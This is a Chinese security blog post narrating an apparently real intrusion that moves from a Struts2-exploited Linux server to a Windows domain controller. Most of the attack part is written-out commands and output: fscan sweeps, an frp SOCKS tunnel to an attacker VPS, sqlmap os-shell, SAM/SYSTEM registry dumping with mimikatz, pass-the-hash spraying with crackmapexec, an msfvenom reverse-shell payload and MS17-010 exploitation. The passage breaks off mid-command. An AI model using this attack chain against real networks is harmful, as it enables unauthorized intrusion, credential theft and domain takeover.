---
title: 实战|记一次从linux打进域控
url: https://www.secpulse.com/archives/196886.html
source: 安全脉搏
date: 2023-03-03
fetch_date: 2025-10-04T08:30:55.939854
---

# 实战|记一次从linux打进域控

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 实战|记一次从linux打进域控

[脉搏文库](https://www.secpulse.com/archives/category/category/secdocs)

[hackctf](https://www.secpulse.com/newpage/author?author_id=34005)

2023-03-02

10,898

## 记一次从linux打进域控

### 前言：

这个周的话比较忙，就简单复盘一次之前从linux打进域控所涉及的内容，整体来说比较容易理解，从信息收集到权限维持都有所涉及。

### getshell:

通过s2漏洞拿下一个口子，这里怎么看是s2搭建的网站，一个是直接看网站后缀是否是action，另一个是可以对登陆处进行抓包，查看数据包后缀是否包含.action.

这里的话就直接s2一把梭哈。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-1677745396.png "null")

image-20230219225518896

成功拿到权限，这里还是一样上传木马来进行权限维持，至于怎么上传前面文章有讲到过。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-1677745398.png "null")

image-20230219211710691

这里成功上传木马。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-1677745399.png "null")

image-20230219212603213

### 信息收集：

我们对该linux进行简单的信息收集，通过翻看历史记录，数据库文件等获得了几条有效密码：

```
kartxx/karxx
root/root
xxadmin/xx@m453
```

利用fscan扫描该网段：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-1677745400.png "null")

image-20230219212659887

```
./fscan -h 192.168.1.126/16
./fscan -h 192.168.1.126/16 -m netbios
```

可以看到ip地址比较多，这里利用某位师傅（记不太清了）的fscan提取脚本将结果进行整理。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-16777454001.png "null")

image-20230219211810059

```
python fscan.py -i result.txt -o resu.txt
```

该脚本可以对fscan扫描的结果进行整理，整理得到如下结果，可以发现可以利用的点不多。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-1677745401.png "null")

image-20230219213032789

但是通过上面扫描结果我们得知该环境存在域环境：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-1677745402.png "null")

image-20230220094629422

解析在着重对这个域进行渗透，我们前期扫到了一个mysql密码，然后发现这台主机又在域内，所以我们先利用他来做一个域信息收集：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-16777454021.png "null")

image-20230219213218437

### frp代理：

为了方便，我们这里将linux的流量代理出来：

在这里我遇到了一个问题，目标主机出网，并且还能ping通我，但是我代理的时候出现连接拒绝。原因是这台主机限制了端口出网，然后我用fscan扫描该主机，发现8080，8443开着web服务。于是frp的配置文件如下：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-1677745403.png "null")

image-20230219214100471

frps.ini:

```
[common]
bind_port = 8080
```

frpc.ini:

```
[common]
server_addr = vps地址
server_port = 8080

tcp_mux = true
[plugin_socks5]
type = tcp
remote_port = 8443
plugin = socks5
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-16777454031.png "null")

image-20230219214801266

成功将socks流量代理出来：

### 域内信息收集：

连接mysql：

```
proxychains sqlmap -d "mysql://root:root@192.168.1.138:3306/mysql" --os-shell --random-agent
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-1677745405.png "null")

image-20230219214940224

```
net group "domain admins" /domain  #查询域管
net group "Domain Controllers" /domain  #查询域控
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-1677745406.png "null")

img

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-1677745408.png "null")

image-20230219215019508

域控地址：

```
AD-server  192.168.1.5
star       192.168.1.6
```

这里我登陆了他的3389，这里我导出他的注册表，然后拖回本地进行密码读取。

登陆的时候勾选上该配置，不然不能够进行粘贴复制。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-1677745410.png "null")

image-20230220095001280

```
reg save hklmsam sam.hive
reg save hklmsystem system.hive
```

这里成功的导出了该文件：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-1677745414.png "null")

image-20230220095128277

拖到本地利用mimikatz执行：

```
lsadump::sam /sam:sam.hive /system:system.hive
```

读取到了管理员的hahs值：

administrator/541ae40b283303b382a1ffxxxxx

然后利用fscan扫描445端口并将ip提权出来做一个pth攻击：

```
fscan -h 192.168.1.0/16 -p 445
```

tiqu.py:

```
import re
import os
import sys

if sys.argv[1]=="-ii":
    text = open(sys.argv[2], 'r', encoding='UTF-8')
    for i in text:
        ii=i.strip("n")
        obj=re.compile(r'(?P<url>.*?):'+sys.argv[3]+'s+open',re.S)
        resu=obj.finditer(ii)
        for it in resu:
            result = it.group("url")
            print(result)
            with open("port.txt", "a+") as f:
                f.write(result + 'n')
                f.close()
```

```
python tiqu.py -ii resu.txt 445
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-16777454141.png "null")

image-20230220095534027

直接进行密码喷洒：

```
proxychains crackmapexec smb port.txt administrator -H 541ae40b283303b382axxxxxx
```

没有爆出来域用户，只有两个工作组：

```
192.168.1.31    445    PAYROLL          [+] Payrolladministrator
192.168.1.18    445    WIN-69GHL7TASOE  [+] WIN-69GHL7TASOEadministrator
```

### 打ms17010：

上线msf：

这里我生成马子的端口是443端口：

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=443 -f elf > m.elf
```

msf监听上线：

```
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost x.x.x.x
set lport 8080
run
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196886-1677745415.png "null")

image-20230219215405960

fscan扫描得到了几台ms17010：

```
[+] 192.168.1.6 MS17-010 (Windows Server 2008 R2 Standard 7601
[+] 192.168.6.123 MS17-010 (Windows 7 Professional 7601 Service Pack 1)
[+] 192.168.5.112 has DOUBLEPULSAR SMB IMPLANT
[+] 192.168.5.110 has DOUBLEPULSAR SMB IMPLANT
```

添加路由：

```
run autoroute -s 192.168.1.0/16
```

前面已经将流量代理出来了；

利用exe脚本打ms17010，结合网上bat脚本来打：

```
check.bat 192.168.5...